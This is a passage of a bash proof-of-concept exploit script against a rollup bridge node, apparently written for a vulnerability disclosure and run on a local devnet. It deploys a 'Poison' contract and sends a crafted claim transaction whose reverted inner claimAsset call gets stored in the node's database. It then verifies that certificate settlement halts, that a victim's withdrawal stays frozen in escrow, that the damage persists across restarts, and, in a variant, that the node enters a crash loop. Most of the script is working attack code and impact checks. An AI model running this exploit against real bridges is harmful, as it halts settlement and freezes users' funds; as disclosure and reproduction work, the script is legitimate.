blob(){ local out="0x" h; for h in "$@"; do out+="${h#0x}"; done; printf '%s' "$out"; }
decode_deposit(){ local h; h=$(jq -r --arg t "$BRIDGE_TOPIC" \
    '([.logs[]? | select((.topics[0] // "") == $t)][0].data // empty)' "$EV/receipt_$1.json" | sed 's/^0x//')
  [ -n "$h" ] || return 1
  DEP_ON=$((16#${h:120:8})); DEP_OTOK="0x${h:152:40}"
  DEP_DN=$((16#${h:248:8}));   DEP_DA="0x${h:280:40}"
  DEP_AMT=$(cast to-dec "0x${h:320:64}")
  local off len; off=$((16#${h:384:64})); len=$(cast to-dec "0x${h:$((off*2)):64}")
  DEP_META="0x${h:$((off*2+64)):$((len*2))}"
  DEP_IDX=$((16#${h:504:8}))
  DEP_LEAF=$(kk "00$(printf '%08x' $DEP_ON)${DEP_OTOK#0x}$(printf '%08x' $DEP_DN)${DEP_DA#0x}$(printf '%064x' $DEP_AMT)$(cast keccak "$DEP_META" | sed 's/^0x//')")
}
send_bridge(){ local rpc="$1" pk="$2" dn="$3" da="$4" amt="$5" meta="$6" tag="$7" to="$8"
  if cast send "$to" "bridgeAsset(uint32,address,uint256,address,bool,bytes)" \
      "$dn" "$da" "$amt" "0x0000000000000000000000000000000000000000" false "$meta" \
      --rpc-url "$rpc" --private-key "$pk" --value "$amt" --json >"$EV/receipt_$tag.json" 2>"$EV/receipt_$tag.err"; then return 0; fi
  cast send "$to" "bridgeAsset(uint32,address,uint256,address,bytes)" \
      "$dn" "$da" "$amt" "0x0000000000000000000000000000000000000000" "$meta" \
      --rpc-url "$rpc" --private-key "$pk" --value "$amt" --json >"$EV/receipt_$tag.json" 2>"$EV/receipt_$tag.err"
}
ok_tx(){ local s; s=$(jq -r '.status // empty' "$EV/receipt_$1.json"); [[ "$s" == "1" || "$s" == "0x1" ]]; }
claim_receipt_ok(){ ok_tx "$1" && [ "$(jq -r '(.logs // [])|length' "$EV/receipt_$1.json")" = 1 ] \
  && [ "$(jq -r '(.logs // [])[0].topics[0] // empty' "$EV/receipt_$1.json")" = "$CLAIM_TOPIC" ]; }
q_hash(){ cast call "$1" "$2" --rpc-url "$3" 2>/dev/null | grep -oE '0x[0-9a-fA-F]{64}' | head -n1; }
gi_hex(){ printf '0x01%08x%08x' 0 "$1"; }
gi_dec(){ cast to-dec "$(gi_hex "$1")"; }
POISON=$(cast send --create "$INIT" "$BRIDGE_L2" --rpc-url "$L2_RPC" --private-key "$PK_ATK" --json \
  | jq -r '.contractAddress') ; [ -n "$POISON" ] || die "Poison deploy failed"
echo "  Poison @ $POISON"
send_claim(){ # sig tag blob gi_hex mer rer meta
  cast send "$POISON" "$1" "$3" "$4" "$5" "$6" "$DEP_ON" "$DEP_OTOK" "$DEP_DN" "$DEP_DA" "$DEP_AMT" "$7" \
    --rpc-url "$L2_RPC" --private-key "$PK_ATK" --json >"$EV/receipt_$2.json" 2>"$EV/receipt_$2.err"
}
sim_claim(){ cast call "$POISON" "$1" "$2" "$3" "$4" "$5" "$DEP_ON" "$DEP_OTOK" "$DEP_DN" "$DEP_DA" "$DEP_AMT" "$6" --rpc-url "$L2_RPC" >/dev/null 2>&1; }
CLAIM_SIG="claimOnly(bytes,uint256,bytes32,bytes32,uint32,address,uint32,address,uint256,bytes)"
ATTACK_SIG="attackWorstCase(bytes,uint256,bytes32,bytes32,uint32,address,uint32,address,uint256,bytes)"
CRASH_SIG="attackCrash(bytes,uint256,bytes32,bytes32,uint32,address,uint32,address,uint256,bytes)"
tr_count(){ local mode="$1" g="${2:-}"
  case "$mode" in
    valid) jq -n --arg b "$BRIDGE_L2" '[..|objects|select(((.to//"")|ascii_downcase)==$b)|select(((.input//"0x")|ascii_downcase|startswith("0xccaa2d11")))|select(.error==null)]|length';;
    junk)  jq -n --arg b "$BRIDGE_L2" --arg g "$g" '[..|objects|select(((.to//"")|ascii_downcase)==$b)|select(((.input//"0x")|ascii_downcase|startswith("0xccaa2d11")))|select(has("error"))]|length';;
    *)     jq -n --arg b "$BRIDGE_L2" '[..|objects|select(((.to//"")|ascii_downcase)==$b)|select(((.input//"0x")|ascii_downcase|startswith("0xccaa2d11")))]|length';;
  esac; }

log "P0: PREREQUISITES & FRESHNESS"
check "cdk-node up" node_up
check "L1+L2 RPC responsive" sh -c "cast block-number --rpc-url $L1_RPC >/dev/null && cast block-number --rpc-url $L2_RPC >/dev/null"
check "fresh devnet: bridgesync claim table empty" test "$(db_query 'SELECT COUNT(*) FROM claim;')" = 0
check "fresh devnet: zero certificate errors" test "$(err_count)" = 0

log "P1: BEFORE — normal flow (deposit -> GER -> valid claim -> healthy build)"
send_bridge "$L1_RPC" "$PK_ATK" 0 "$DEPLOYER" "$AMOUNT" "0x01" deposit1 "$BRIDGE_L1" || die "deposit #1 failed"
ok_tx deposit1 || die "deposit #1 status!=1"
decode_deposit deposit1 || die "no BridgeEvent in deposit receipt (bridgeAsset ABI mismatch?)"
MER1=$(q_hash "$GER_L1" 'mainnetExitRoot()' "$L1_RPC") || die "read MER failed"
[ "$(root_single "$DEP_LEAF")" = "$MER1" ] || echo "  WARN: on-chain MER != computed single-leaf root (check DEP_LEAF format)"
RER=$(q_hash "$GER_L1" 'rollupExitRoot()' "$L1_RPC")
GI0_HEX=$(gi_hex "$DEP_IDX"); GI0_DEC=$(gi_dec "$DEP_IDX")
PROOF0=$(blob "${Z_LAD[@]}")
GER_CTL=$(kk2 "$MER1" "$RER")
send_bridge "$L2_RPC" "$PK_ATK" 1 "$DEPLOYER" "$AMOUNT" "0x" l2bridge_before "$BRIDGE_L2" || true
poll_check "GER #1 propagated to L2 by AggOracle — control claim sim passes" 600 \
  sim_claim "$CLAIM_SIG" "$PROOF0" "$GI0_HEX" "$MER1" "$RER" "$DEP_META" \
  || die "control claim never valid — check: docker logs $NODE | grep -i oracle"
send_claim "$CLAIM_SIG" control_claim "$PROOF0" "$GI0_HEX" "$MER1" "$RER" "$DEP_META" || die "control claim send failed"
claim_receipt_ok control_claim || die "control claim receipt invalid (status/logs/topic)"
check "BEFORE: control claim mined — status=1, exactly 1 ClaimEvent" true
poll_check "BEFORE: certificate build includes control claim (numClaims: 1)" 900 grep_numclaims 1
check "BEFORE: zero aggsender errors (healthy)" test "$(err_count)" = 0
poll_check "BEFORE: bridgesync stored VALID calldata (DB GER == on-chain GER)" 300 db_row_ger "$GI0_DEC" "$GER_CTL"
db_dump before; ERR_BEFORE=$(err_count); CERT_BEFORE=$(cert_count)

log "P2: EXPLOIT — one attack transaction"
send_bridge "$L1_RPC" "$PK_ATK" 0 "$DEPLOYER" "$AMOUNT" "0x02" deposit2 "$BRIDGE_L1" || die "deposit #2 failed"
ok_tx deposit2 || die "deposit #2 status!=1"
decode_deposit deposit2 || die "decode deposit #2 failed"
LEAF0="$DEP_LEAF"; LEAF1=$(kk "00$(printf '%08x' $DEP_ON)${DEP_OTOK#0x}$(printf '%08x' $DEP_DN)${DEP_DA#0x}$(printf '%064x' $DEP_AMT)$(cast keccak "$DEP_META" | sed 's/^0x//')")
MER2=$(q_hash "$GER_L1" 'mainnetExitRoot()' "$L1_RPC")
check "exit-tree math: on-chain MER == root over [leaf0, leaf1]" test "$MER2" = "$(root_pair "$LEAF0" "$LEAF1")"
GI1_HEX=$(gi_hex "$DEP_IDX"); GI1_DEC=$(gi_dec "$DEP_IDX")
PROOF1=$(blob "$LEAF0" "${Z_LAD[@]:1}")
poll_check "GER #2 propagated — attack claim sim passes" 600 \
  sim_claim "$ATTACK_SIG" "$PROOF1" "$GI1_HEX" "$MER2" "$RER" "$DEP_META" \
  || die "attack claim never valid"
ATTACK_OFF=$(stat -c %s "$EV/node.log")
send_claim "$ATTACK_SIG" attack "$PROOF1" "$GI1_HEX" "$MER2" "$RER" "$DEP_META" || die "attack send failed"
claim_receipt_ok attack || die "attack receipt invalid — outer tx must SUCCEED with exactly ONE ClaimEvent"
check "EXPLOIT: attack tx mined — status=1, exactly ONE ClaimEvent" true
ATTACK_TX=$(jq -r '.transactionHash' "$EV/receipt_attack.json")
cast rpc debug_traceTransaction "$ATTACK_TX" '{"tracer":"callTracer"}' --rpc-url "$L2_RPC" > "$EV/trace_attack.json" 2>/dev/null || true
check "trace: >=2 claimAsset frames in ONE tx" test "$(tr_count all)" -ge 2
check "trace: exactly 1 non-reverted claimAsset frame" test "$(tr_count valid)" -eq 1
check "trace: >=1 REVERTED claimAsset frame (recorded despite revert — root cause)" test "$(tr_count junk)" -ge 1
send_bridge "$L2_RPC" "$PK_ATK" 1 "$DEPLOYER" "$AMOUNT" "0x" l2bridge_after "$BRIDGE_L2" || true

log "P3: AFTER — poisoned DB + error loop"
poll_check "AFTER: certificate build FAILS on poisoned claim" 900 err_at_least 1
check "AFTER: error repeats every 6s epoch (>=5)" err_at_least 5
JUNK_GER=$(kk2 "$JUNK_MER" "$JUNK_RER")
check "AFTER: DB row stores POISONED GER (not the valid one)" db_row_ger "$GI1_DEC" "$JUNK_GER"
check "AFTER: poisoned row carries JUNK MER (overwrite proof)" db_row_junk "$GI1_DEC"
check "AFTER: control claim row still valid (selective overwrite)" db_row_ger "$GI0_DEC" "$GER_CTL"
db_dump after

log "P4: IMPACT — settlement halt (${WATCH_MIN} min)"
for m in $(seq 1 "$WATCH_MIN"); do sleep 60; echo "    [$m/$WATCH_MIN] errors=$(err_count) certs=$(cert_count)"; done
CERT_AFTER=$(cert_count)
check "IMPACT: certificate count FROZEN ($CERT_BEFORE -> $CERT_AFTER)" test "$CERT_AFTER" = "$CERT_BEFORE"
check "IMPACT: FromBlock PINNED post-attack" \
  sh -c "tail -c +$((ATTACK_OFF+1)) '$EV/node.log' | grep -oE 'FromBlock: [0-9]+' | sort -u | wc -l | grep -q '^[01]\$'"
check "IMPACT: error loop still accumulating" err_at_least $((5 + WATCH_MIN*5))
ERR_FINAL=$(err_count)

log "P5: IMPACT — victim funds frozen"
VICTIM_INFO=$(cast wallet new)
VICTIM=$(printf '%s\n' "$VICTIM_INFO" | grep -oE '0x[0-9a-fA-F]{40}' | head -n1)
PK_VIC=$(printf '%s\n' "$VICTIM_INFO" | grep -oE '0x[0-9a-fA-F]{64}' | head -n1)
cast send "$VICTIM" --value 1ether --rpc-url "$L2_RPC" --private-key "$PK_ATK" --json >/dev/null 2>&1 || die "fund victim failed"
V_B0=$(cast balance "$VICTIM" --rpc-url "$L2_RPC"); E_B0=$(cast balance "$BRIDGE_L2" --rpc-url "$L2_RPC")
send_bridge "$L2_RPC" "$PK_VIC" 1 "$VICTIM" "$AMOUNT" "0x" victim_withdrawal "$BRIDGE_L2" || die "victim withdrawal failed"
V_B1=$(cast balance "$VICTIM" --rpc-url "$L2_RPC"); E_B1=$(cast balance "$BRIDGE_L2" --rpc-url "$L2_RPC")
check "victim withdrawal SUCCEEDED on L2 (funds left the user)" sh -c "test $((V_B0 - V_B1)) -ge $AMOUNT"
check "funds locked in L2 bridge escrow (+exact amount)" sh -c "test $((E_B1 - E_B0)) -eq $AMOUNT"
echo "  => no certificate => exit root never reaches L1 => FUNDS FROZEN"

log "P6: IMPACT — persists across restart"
docker restart "$NODE" >/dev/null 2>&1 || die "restart failed"
poll_check "cdk-node back up" 300 node_up
E0=$(err_count)
poll_check "error loop RESUMES after restart (persistent poisoning)" 900 err_gt "$E0"
check "poisoned row still present after restart" db_row_ger "$GI1_DEC" "$JUNK_GER"
db_dump post_restart

if [ "$RUN_CRASH" = 1 ]; then
  log "P7: VARIANT A — crash loop"
  send_bridge "$L1_RPC" "$PK_ATK" 0 "$DEPLOYER" "$AMOUNT" "0x03" deposit3 "$BRIDGE_L1" || die "deposit #3 failed"
  ok_tx deposit3 || die "deposit #3 status!=1"
  decode_deposit deposit3 || die "decode deposit #3 failed"
  LEAF2=$(kk "00$(printf '%08x' $DEP_ON)${DEP_OTOK#0x}$(printf '%08x' $DEP_DN)${DEP_DA#0x}$(printf '%064x' $DEP_AMT)$(cast keccak "$DEP_META" | sed 's/^0x//')")
  MER3=$(q_hash "$GER_L1" 'mainnetExitRoot()' "$L1_RPC")
  check "tree math after deposit #3" test "$MER3" = "$(root_triple "$LEAF0" "$LEAF1" "$LEAF2")"
  GI2_HEX=$(gi_hex "$DEP_IDX")
  PROOF2=$(blob "${Z_LAD[0]}" "$(kk2 "$LEAF0" "$LEAF1")" "${Z_LAD[@]:2}")
  poll_check "GER #3 propagated — crash claim sim passes" 600 \
    sim_claim "$CRASH_SIG" "$PROOF2" "$GI2_HEX" "$MER3" "$RER" "$DEP_META" || die "crash claim never valid"
  send_claim "$CRASH_SIG" attack_crash "$PROOF2" "$GI2_HEX" "$MER3" "$RER" "$DEP_META" || die "crash send failed"
  claim_receipt_ok attack_crash || die "crash receipt invalid"
  check "VARIANT A: crash tx mined (1 valid ClaimEvent)" true
  cast rpc debug_traceTransaction "$(jq -r '.transactionHash' "$EV/receipt_attack_crash.json")" '{"tracer":"callTracer"}' --rpc-url "$L2_RPC" > "$EV/trace_crash.json" 2>/dev/null || true
  check "VARIANT A: trace has bridge call with <4-byte input" \
    sh -c "test \$(jq --arg b '$BRIDGE_L2' '[..|objects|select(((.to//\"\")|ascii_downcase)==(\$b|ascii_downcase))|select((((.input//\"0x\")|length)-2)/2 < 4)]|length' '$EV/trace_crash.json') -ge 1"
  poll_check "VARIANT A: crash-restart loop (RestartCount >= 2)" 600 \
    sh -c "test \$(docker inspect -f '{{.RestartCount}}' $NODE) -ge 2"
  check "VARIANT A: panic 'slice bounds out of range' in log" grep_log "slice bounds out of range"
fi

log "SUMMARY"
printf '\n  cert errors : %s -> %s (every 6s, forever)\n  certs       : %s -> %s (FROZEN)\n  victim      : withdrawal OK, funds stuck in escrow\n  restart     : error resumes (persistent)\n' \
  "$ERR_BEFORE" "$ERR_FINAL" "$CERT_BEFORE" "$CERT_AFTER"
printf '\n---- RESULTS ----\n'
for r in "${RESULTS[@]}"; do printf '[%s] %s\n' "${r%%|*}" "${r#*|}"; done
printf '\nEvidence: %s (receipts, traces, DB dumps, full node.log)\n' "$EV"
fails=0; for r in "${RESULTS[@]}"; do case "$r" in FAIL*) fails=$((fails+1));; esac; done
[ "$fails" -gt 0 ] && echo "HARD FAILURES: $fails"
exit $(( fails > 0 ? 1 : 0 ))
